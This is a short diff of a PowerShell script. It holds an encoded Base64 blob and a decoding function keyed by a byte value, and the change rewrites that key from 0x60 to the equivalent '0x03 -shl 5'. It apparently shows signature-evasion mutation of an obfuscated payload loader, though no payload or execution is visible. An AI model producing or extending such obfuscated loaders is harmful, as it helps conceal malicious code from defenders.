@@ -3,7 +3,7 @@ ${random_var_1} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPUlhWA1BXUFhQWAQEB
 ${process_function} = { 
     param(
         [string]${input_data},
-        [int]${transform_value} = 0x60
+        [int]${transform_value} = 0x03 -shl 5
     )
     
     ${converted_bytes} = [Convert]::FromBase64String(${input_data})
